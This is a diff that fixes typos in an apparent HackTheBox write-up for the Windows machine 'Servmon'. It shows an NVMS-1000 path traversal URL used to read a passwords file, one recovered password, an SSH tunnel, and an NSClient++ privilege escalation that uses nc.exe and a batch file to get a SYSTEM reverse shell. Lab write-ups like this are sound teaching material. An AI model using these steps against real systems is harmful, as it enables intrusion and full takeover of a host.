@@ -2,7 +2,7 @@
 
 This time, I will introduce an approach to solving "Servmon", an easy Windows machine in hackthebox that required two exploits.
 
-The box starts with ftp enumeration, which reveals that there is a txt file on the desktop of one of the users with passwords in it. Enumerating http on port 80, we see that it is running NVMS-1000 Web server vulnerable to path traversal, which can be used to read the passwords file. One of the passwords work with SSH and we can get user flag.
+The box starts with ftp enumeration, which reveals that there is a txt file on the desktop of one of the users with passwords in it. Enumerating http on port 80, we see that it is running NVMS-1000 Web server vulnerable to path traversal, which can be used to read the passwords file. One of the passwords works with SSH and we can get user flag.
 
 To get System I exploit a vulnerability in NSClient++ running with https on port 8443, which allows to run commands in the context of system.
 ## Recon
@@ -231,7 +231,7 @@ Scanning through the list, things to check out will be FTP (TCP 21) with anonymo
 
 ## FTP - TCP 21
 
-Since `nmap` identifiead that anonymous FTP login was enabled, we can login into the FTP server using "anonymous" for the username and password.
+Since `nmap` identified that anonymous FTP login was enabled, we can login into the FTP server using "anonymous" for the username and password.
 
 ```
 ┌──(10.10.14.154)─(kali@kali)-[~/boxes/servmon]
@@ -274,7 +274,7 @@ This file contains references for two applications, NVMS and NSClient, make a no
 
 ## SMB - TCP 445
 
-Without crendentials it appears we can't connect to SMB.
+Without credentials it appears we can't connect to SMB.
 
 ```
 ┌──(10.10.14.154)─(kali@kali)-[~/boxes/servmon]
@@ -284,16 +284,16 @@ Without crendentials it appears we can't connect to SMB.
 
 ## HTTP - TCP 80
 
-If i go to `http://10.10.10.184/`, i can see that NVMS-1000 us running and it redirects me to `/Pages/login.htm`
+If I go to `http://10.10.10.184/`, i can see that NVMS-1000 is running and it redirects me to `/Pages/login.htm`
 
 
 Trying to guess the user and password didn't work.
 
-A google search revals a directory traversal vulnerability related to NVMS 1000.
-![](attachments/Pasted image 20260505185910.png)
+A google search reveals a directory traversal vulnerability related to NVMS 1000.
+![](attachments/Pasted%20image%2020260505185910.png)
 It basically says I can request `/../../../../../../../../../../../../windows/win.ini` and get it.
 
-![](attachments/{08E98797-AC05-4787-9689-54B1BD7709C3}.png)
+![](attachments/%7B08E98797-AC05-4787-9689-54B1BD7709C3%7D.png)
 
 ## Shell as nadine
 
@@ -304,7 +304,7 @@ We can check for the `Passwords.txt` file mentioned in the note
 http://10.129.30.98/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers/Nathan/Desktop/passwords.txt
 ```
 
-![](attachments/{A97B5C3B-6D85-48AF-8A75-0876205D9515}.png)
+![](attachments/%7BA97B5C3B-6D85-48AF-8A75-0876205D9515%7D.png)
 
 ```
 1nsp3ctTh3Way2Mars!
@@ -348,14 +348,14 @@ servmon\nadine
 ```
 
 
-## Privilege scalation
+## Privilege Escalation
 
-I previously learned  from the FTP file called "Notes to do.txt"  a service called `NSCLient++` could be running on the box.
+I previously learned  from the FTP file called "Notes to do.txt"  a service called `NSClient++` could be running on the box.
 
 
 I check `https://10.129.30.117:8443` and get to NSClient ++ login page.
 
-Looking for a vulnerability related to NSClient++ I get this privilege scalation vulnerability
+Looking for a vulnerability related to NSClient++ I get this privilege escalation vulnerability
 https://www.exploit-db.com/exploits/46802
 
 From reading it we can see the admin password is stored at `c:\program files\nsclient++\nsclient.ini`
@@ -376,7 +376,7 @@ allowed hosts = 127.0.0.1
 ```
 
 If I try to login I get 403 You're not allowed error
-![](attachments/{AD33A294-B4B9-45E4-B5B4-52F1774DB925}.png)
+![](attachments/%7BAD33A294-B4B9-45E4-B5B4-52F1774DB925%7D.png)
 
 The nsclient.ini file reveals `allowed hosts` is set to `127.0.0.1`
 
@@ -388,10 +388,10 @@ ssh -N -L 8443:127.0.0.1:8443 nadine@10.129.30.117
 
 Then I can login into the Web at `https://localhost:8443`
 
-Two files must exist on the victim's machine.
+Two files need to be placed on the victim machine.
 
 ```
-nc.exe - Used for stablishing a reverse shell as System
+nc.exe - Used for establishing a reverse shell as System
 evil.bat - You can name this file whatever you like. Put the following shell code inside:
 
 @echo off
@@ -409,33 +409,33 @@ scp nc.exe nadine@10.129.30.117:/temp
 ```
 
 
-Next, I will create an "external script". Go to Go to Settings -> external scripts -> scripts 
+Next, I will create an "external script". Go to Settings -> external scripts -> scripts 
 and press the "Add new" button.
-![](attachments/Pasted image 20260504204245.png)
+![](attachments/Pasted%20image%2020260504204245.png)
 
 Complete the fields as shown.
 
 After hitting add go to "Changes" and click `Save configuration`
-![](attachments/{4584246E-5AAB-4248-8A88-3268B5B043E8}.png)
+![](attachments/%7B4584246E-5AAB-4248-8A88-3268B5B043E8%7D.png)
 
 Next click "Control" and click `Reload`
-![](attachments/Pasted image 20260504204530.png)
+![](attachments/Pasted%20image%2020260504204530.png)
 
 
 Then go to "Queries" and select the script 'pe'
 
-![](attachments/{AF4A018B-927A-4CCE-B603-62B8713463B4}.png)
+![](attachments/%7BAF4A018B-927A-4CCE-B603-62B8713463B4%7D.png)
 
 
 
-Start a listener on my kali:
+Start a listener on my kali machine:
 ```
 nc -lnvp 443
 ```
 
 
 And then run the script
-![](attachments/{3D1BE34A-2340-40D7-B9A0-13D8882623D8}.png)
+![](attachments/%7B3D1BE34A-2340-40D7-B9A0-13D8882623D8%7D.png)
 
 With the exploit successfully executed we get a reverse-shell as nt authority\system
 ```
